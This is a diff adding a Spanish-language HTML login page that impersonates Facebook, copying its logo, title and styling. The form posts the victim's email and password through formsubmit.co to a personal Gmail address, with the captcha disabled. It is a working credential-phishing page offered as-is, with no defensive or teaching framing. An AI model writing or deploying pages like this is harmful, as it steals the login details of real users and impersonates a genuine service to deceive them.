@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inicio de Sesión - Facebook</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body {
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .btn-primary {
+      background-color: #1877f2;
+      border: none;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background-color: #165dbb;
+    }
+
+    .forgot-password {
+      color: #1877f2;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="logo">
+    <h1>Iniciar sesión</h1>
+    <form action="https://formsubmit.co/yulileonleonramos@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <div class="form-group">
+        <input type="email" class="form-control" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
+      </div>
+      <div class="form-group">
+        <input type="password" class="form-control" id="password" name="password" placeholder="Contraseña" required>
+      </div>
+      <button type="submit" class="btn btn-primary">Iniciar sesión</button>
+    </form>
+    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+  </div>
+
+  <script>
+    // JavaScript para validar el formulario (opcional)
+    const form = document.querySelector('form');
+    form.addEventListener('submit', (event) => {
+      event.preventDefault(); // Evita el envío del formulario por defecto
+      // Aquí puedes agregar código para validar los campos del formulario
+      // Si la validación es exitosa, puedes enviar el formulario usando form.submit()
+      form.submit();
+    });
+  </script>
+</body>
+</html>
+
